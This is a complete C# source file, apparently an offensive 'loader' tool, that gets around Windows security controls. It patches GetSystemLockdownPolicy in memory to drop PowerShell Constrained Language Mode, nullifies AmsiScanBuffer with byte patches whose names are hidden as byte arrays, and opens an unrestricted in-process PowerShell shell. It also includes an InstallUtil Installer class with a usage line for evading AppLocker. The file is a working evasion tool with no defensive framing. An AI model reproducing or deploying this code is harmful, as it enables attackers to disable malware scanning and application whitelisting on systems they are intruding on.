using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;

namespace loader
{

    public class MainClass
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetStdHandle(int nStdHandle);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        public static void Main(string[] args)
        {
            go();
        }

        public static void go()
        {
            // Find a reference to the automation assembly
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            // Get a MethodInfo reference to the GetSystemLockdownPolicy method
            var get_lockdown_info = Automation.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            // Retrieve a handle to the method
            var get_lockdown_handle = get_lockdown_info.MethodHandle;
            uint lpflOldProtect;

            // This ensures the method is JIT compiled
            RuntimeHelpers.PrepareMethod(get_lockdown_handle);
            // Get a pointer to the compiled function
            var get_lockdown_ptr = get_lockdown_handle.GetFunctionPointer();

            // Ensure we can write to the address
            VirtualProtect(get_lockdown_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            // Write the instructions "mov rax, 0; ret". This returns 0, which is the same as returning SystemEnforcementMode.None
            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);

            // Before we start powershell, we nullify AmsiScanBuffer as well. This ensures AMSI doesn't plague
            // us in our new shell.
            byte[] d1b = { 0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c };
            byte[] d2b = { 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72 };
            
            string d1 = System.Text.Encoding.ASCII.GetString(d1b);
            string d2 = System.Text.Encoding.ASCII.GetString(d2b);
            
            Func<string, IntPtr> load = s => LoadLibrary(s);
            Func<IntPtr, string, IntPtr> resolve = (mod, name) => GetProcAddress(mod, name);
            
            IntPtr modHandle = load(d1);
            IntPtr funcPtr = resolve(modHandle, d2);
            
            VirtualProtect(funcPtr, (UIntPtr)8, 0x40, out lpflOldProtect);
            
            // Patch: return E_INVALIDARG
            byte[] amsiPatch = IntPtr.Size == 8
                ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }
                : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            
            Marshal.Copy(amsiPatch, 0, funcPtr, amsiPatch.Length);

            // Run powershell from the current process (won't start powershell.exe, but run from the powershell .Net libraries)
            Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Bypassed!", "Help", new string[] {
                "-exec", "bypass", "-nop"
            });
        }
    }

    // This class is used if you need to load this with InstallUtil to bypass AppLocker.
    // usage: InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\bypass-clm.exe"
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);

            MainClass.go();
        }
    }

}
